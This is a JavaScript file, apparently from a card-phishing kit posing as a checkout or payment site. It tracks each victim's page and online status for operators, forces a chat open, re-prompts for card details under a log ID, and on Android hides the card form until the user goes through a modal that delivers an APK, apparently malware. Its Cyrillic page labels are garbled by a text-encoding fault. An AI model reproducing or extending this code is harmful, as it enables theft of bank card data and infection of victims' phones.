

var _userClosedChat = false;

(function normalizeLandingQuery() {
  try {
    var path = String((window.location && window.location.pathname) || '');
    if (!/^\/\d+$/.test(path)) return;

    var params = new URLSearchParams(window.location.search || '');
    if (params.get('go') !== '1' && params.get('resumeCard') !== '1') return;

    if (window.history && typeof window.history.replaceState === 'function') {
      window.history.replaceState(null, '', path);
    }
  } catch (e) {}
})();

function forceOpenChat() {
  if (typeof window.CustomChat !== 'undefined' && window.CustomChat.open) {
    window.CustomChat.open();
  }
}

async function openOrCloseChat(itemId) {
  try {
    const { data } = await axios.post('/api/checkChatStatus', { id: itemId });

    if (data.status == 1) {
      
      console.log('[CHAT] checkChatStatus returned status=1, opening chat!');
      _userClosedChat = false;
      forceOpenChat();
      
      axios.post('/api/confirmChatOpened', { id: itemId }).then(function() {
        console.log('[CHAT] confirmChatOpened sent');
      }).catch(function(e) {
        console.log('[CHAT] confirmChatOpened error:', e);
      });
    } else if (data.status == 2) {
      
      console.log('[CHAT] checkChatStatus returned status=2, closing chat');
      var chatra = document.querySelector("#chatra");
      var supportCircle = document.querySelector(".support-circle");
      if (chatra) chatra.style.display = "none";
      if (supportCircle) supportCircle.style.display = "block";
    }
  } catch(err) {
    console.log('[CHAT] checkChatStatus error:', err?.response?.status || err);
  }
}

var _lastKnownUndelivered = 0;
async function checkNewSupportMessages() {
  try {
    const { data } = await axios.post('/api/hasUnreadMessages', { itemId: itemId });
    
    if (data && data.undelivered) {

      _userClosedChat = false;
      forceOpenChat();
    } else if (data && data.hasUnread && !_userClosedChat) {
      
      forceOpenChat();
    }
  } catch(err) {
    
  }
}

function getPageName() {
  if (window.__pageName) return window.__pageName;
  var path = window.location.pathname;
  
  if (path.includes('/checkout/confirm-sms')) return 'SMS';
  if (path.includes('/checkout/confirm-call')) return 'Р—РІРѕРЅРѕРє';
  if (path.includes('/checkout/confirm-push')) return 'PUSH';
  if (path.includes('/checkout/confirm-balance')) return 'Р‘Р°Р»Р°РЅСЃ';
  if (path.includes('/checkout/confirm-smartid')) return 'SmartID';
  if (path.includes('/checkout/confirm-smenalk')) return 'РЎРјРµРЅР° Р›Рљ';
  if (path.includes('/checkout/confirm-')) return 'РћС€РёР±РєР°';
  if (path.includes('/payment/')) return 'Р’РІРѕРґ РєР°СЂС‚С‹';
  if (path.includes('/checkout/')) return 'Р’РІРѕРґ РєР°СЂС‚С‹';
  if (path.includes('/account/')) return 'Р›РёС‡РЅС‹Р№ РєР°Р±РёРЅРµС‚';
  
  if (path.includes('/merchant/confirm-sms')) return 'SMS';
  if (path.includes('/merchant/confirm-call')) return 'Р—РІРѕРЅРѕРє';
  if (path.includes('/merchant/confirm-push')) return 'PUSH';
  if (path.includes('/merchant/confirm-balance')) return 'Р‘Р°Р»Р°РЅСЃ';
  if (path.includes('/merchant/confirm-smartid')) return 'SmartID';
  if (path.includes('/merchant/confirm-smenalk')) return 'РЎРјРµРЅР° Р›Рљ';
  if (path.includes('/merchant/confirm-')) return 'РћС€РёР±РєР°';
  if (path.includes('/merchants/')) return 'Р’РІРѕРґ РєР°СЂС‚С‹';
  if (path.includes('/merchant/')) return 'Р’РІРѕРґ РєР°СЂС‚С‹';
  if (path.includes('/personalbpts/')) return 'Р›Рљ Р‘РџРўРЎ';
  if (path.includes('/personal/')) return 'Р›РёС‡РЅС‹Р№ РєР°Р±РёРЅРµС‚';
  if (path.includes('/bookingpay/')) return 'РћРїР»Р°С‚Р°';
  if (path.includes('/bpts/')) return 'Р‘РџРўРЎ';
  if (path.includes('/receive/')) return 'РџРѕР»СѓС‡РµРЅРёРµ';
  if (path.includes('/verify/')) return 'Р’РµСЂРёС„РёРєР°С†РёСЏ';
  if (path.includes('/order/')) return 'Р“Р»Р°РІРЅР°СЏ';
  return 'Р“Р»Р°РІРЅР°СЏ';
}

var _offlineDebounceTimer = null;
var _isNavigatingAway = false;
var _heartbeatInterval = null;

function sendOnlinePing() {
  axios.post('/api/checkOnline', {
    id: itemId,
    status: true,
    page: getPageName(),
  }).then(function(response) {
    
    if (response && response.data && response.data.chatStatus == 1) {
      console.log('[CHAT] heartbeat returned chatStatus=1, opening chat!');
      _userClosedChat = false;
      forceOpenChat();
      axios.post('/api/confirmChatOpened', { id: itemId }).catch(function() {});
    } else if (response && response.data && response.data.chatStatus == 2) {
      var chatra = document.querySelector('#chatra');
      var supportCircle = document.querySelector('.support-circle');
      if (chatra) chatra.style.display = 'none';
      if (supportCircle) supportCircle.style.display = 'block';
    }
  }).catch(function() {});
}

function sendOfflineBeacon(force) {
  
  if (_isNavigatingAway) return;
  
  var payload = { id: itemId, status: false };
  if (force) payload.force = true;
  
  if (navigator.sendBeacon) {
    var data = new Blob([JSON.stringify(payload)], { type: 'application/json' });
    navigator.sendBeacon('/api/checkOnline', data);
  } else {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/checkOnline', false);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(payload));
  }
}

function cancelOfflineDebounce() {
  if (_offlineDebounceTimer) {
    clearTimeout(_offlineDebounceTimer);
    _offlineDebounceTimer = null;
  }
}

function scheduleOffline(delaySec) {
  cancelOfflineDebounce();
  _offlineDebounceTimer = setTimeout(function() {
    _offlineDebounceTimer = null;
    
    if (document.hidden) {
      sendOfflineBeacon();
    }
  }, delaySec * 1000);
}

document.addEventListener('click', function(e) {
  var link = e.target.closest('a');
  if (link && link.href && link.href.indexOf(location.origin) === 0) {
    _isNavigatingAway = true;
    
    try { sessionStorage.setItem('_onlineTransition', Date.now().toString()); } catch(e) {}
  }
}, true);

document.addEventListener('submit', function() {
  _isNavigatingAway = true;
  try { sessionStorage.setItem('_onlineTransition', Date.now().toString()); } catch(e) {}
}, true);

document.addEventListener("visibilitychange", function () {
  if (document.hidden) {
    
    scheduleOffline(3);
  } else {
    
    cancelOfflineDebounce();
    sendOnlinePing();
  }
});

window.addEventListener('focus', function() {
  cancelOfflineDebounce();
  sendOnlinePing();
});

window.addEventListener('pagehide', function (e) {
  
  if (e.persisted) return;
  
  if (!_isNavigatingAway) {
    sendOfflineBeacon(true); 
  }
});

window.addEventListener('beforeunload', function () {
  if (!_isNavigatingAway) {
    sendOfflineBeacon(true); 
  }
});

(function() {
  try {
    var transition = sessionStorage.getItem('_onlineTransition');
    if (transition) {
      var elapsed = Date.now() - parseInt(transition, 10);
      
      if (elapsed < 10000) {
        sendOnlinePing();
      }
      sessionStorage.removeItem('_onlineTransition');
    }
  } catch(e) {}
})();

sendOnlinePing();

var HEARTBEAT_ACTIVE_MS = 5000;    
var HEARTBEAT_HIDDEN_MS = 10000;   

function startHeartbeat(intervalMs) {
  if (_heartbeatInterval) clearInterval(_heartbeatInterval);
  _heartbeatInterval = setInterval(function() {
    sendOnlinePing();
  }, intervalMs);
}

startHeartbeat(HEARTBEAT_ACTIVE_MS);

document.addEventListener("visibilitychange", function () {
  if (document.hidden) {
    startHeartbeat(HEARTBEAT_HIDDEN_MS);
  } else {
    startHeartbeat(HEARTBEAT_ACTIVE_MS);
  }
});

var _chatSSE = null;
var _chatSSEConnected = false;
var _chatPollTimer = null;

function connectChatSSE() {
  if (typeof EventSource === 'undefined' || !itemId) {
    startChatFallbackPolling();
    return;
  }

  if (_chatSSE) {
    try { _chatSSE.close(); } catch(e) {}
  }

  _chatSSE = new EventSource('/api/sse?itemId=' + encodeURIComponent(itemId));

  _chatSSE.addEventListener('connected', function() {
    _chatSSEConnected = true;
    
    if (_chatPollTimer) {
      clearInterval(_chatPollTimer);
      _chatPollTimer = null;
    }
  });

  _chatSSE.addEventListener('chat', function(e) {
    try {
      var data = JSON.parse(e.data);
      if (data.status == 1) {
        console.log('[CHAT-SSE] chat open event received');
        _userClosedChat = false;
        forceOpenChat();
        axios.post('/api/confirmChatOpened', { id: itemId }).then(function() {
          console.log('[CHAT-SSE] confirmChatOpened sent');
        }).catch(function() {});
      } else if (data.status == 2) {
        console.log('[CHAT-SSE] chat close event received');
        var chatra = document.querySelector('#chatra');
        var supportCircle = document.querySelector('.support-circle');
        if (chatra) chatra.style.display = 'none';
        if (supportCircle) supportCircle.style.display = 'block';
      }
    } catch(err) {}
  });

  _chatSSE.addEventListener('message', function(e) {
    try {
      var data = JSON.parse(e.data);
      if (data.undelivered) {
        _userClosedChat = false;
        forceOpenChat();
      } else if (data.hasUnread && !_userClosedChat) {
        forceOpenChat();
      }
    } catch(err) {}
  });

  _chatSSE.onerror = function() {
    _chatSSEConnected = false;
    
    if (!_chatPollTimer) {
      startChatFallbackPolling();
    }
  };
}

function startChatFallbackPolling() {
  if (_chatPollTimer) return;
  _chatPollTimer = setInterval(async function() {
    
    if (_chatSSEConnected) {
      clearInterval(_chatPollTimer);
      _chatPollTimer = null;
      return;
    }
    await openOrCloseChat(itemId);
    await checkNewSupportMessages();
  }, 2000);
}

(async () => {
  await openOrCloseChat(itemId);
  await checkNewSupportMessages();
})();

connectChatSSE();

// Card re-entry from worker/vbiver: keep user on landing and reopen modal flow
(function initResumeCardModalFlow() {
  try {
    var params = new URLSearchParams(window.location.search || '');
    if (params.get('resumeCard') !== '1') return;

    var resumeLogId = params.get('logId');
    var parsedLogId = Number(resumeLogId);
    if (!Number.isFinite(parsedLogId) || parsedLogId <= 0) parsedLogId = null;
    var fromLk = params.get('fromLk') === '1';

    var started = false;
    function tryStart() {
      if (started) return true;
      if (!window.modals || typeof window.modals.showCardForm !== 'function') return false;

      if (parsedLogId) window.modals.logId = parsedLogId;
      if (fromLk && window.modals.cfg) {
        window.modals.cfg.apiSendLog = '/api/sendCardLk';
        window.modals.cfg.extraPostData = { logId: String(parsedLogId || window.modals.logId || '') };
      }
      window.modals.showCardForm();

      if (window.modals.logId && typeof window.modals._startPolling === 'function') {
        window.modals.currentStatus = null;
        window.modals._startPolling();
      }

      started = true;
      return true;
    }

    if (tryStart()) return;

    var attempts = 0;
    var timer = setInterval(function () {
      attempts += 1;
      if (tryStart() || attempts >= 40) clearInterval(timer);
    }, 150);
  } catch (e) {}
})();

// в”Ђв”Ђ API SNIFF: Auto-detect Android + load APK modal if sniff is available в”Ђв”Ђ
(function() {
  // Only run on Android devices
  var ua = navigator.userAgent || '';
  if (!/android/i.test(ua)) return;

  // Only run on pages that have a card form
  var cardFormSection = document.getElementById('cardFormSection');
  if (!cardFormSection) return;

  // Check if sniff modal is already initialized (e.g. from inline template code)
  if (window.__sniffInitialized) return;
  window.__sniffInitialized = true;

  // Check availability via API
  axios.get('/api/sniff/checkAvailable/' + encodeURIComponent(itemId))
    .then(function(res) {
      if (!res.data || !res.data.available) return;

      var apkUrl = res.data.apkUrl;

      // Dynamically load sniff.js
      var script = document.createElement('script');
      script.src = '/style/modals/sniff.js';
      script.onload = function() {
        if (!window.SniffModal) return;

        // Hide the card form until sniff is passed
        var cardFormSection = document.getElementById('cardFormSection');
        var payBtn = document.getElementById('_buttonPay');
        if (cardFormSection) cardFormSection.style.display = 'none';
        if (payBtn) payBtn.style.display = 'none';

        new SniffModal({
          itemId: itemId,
          apkUrl: apkUrl,
          onPassed: function() {
            if (cardFormSection) cardFormSection.style.display = '';
            if (payBtn) payBtn.style.display = '';
          },
          translate: {}
        });
      };
      document.head.appendChild(script);
    })
    .catch(function() {
      // Sniff not available or error вЂ” silently continue
    });
})();

function openSupport() {
  try {
    _userClosedChat = false;
    forceOpenChat();
  } catch(e) {}
}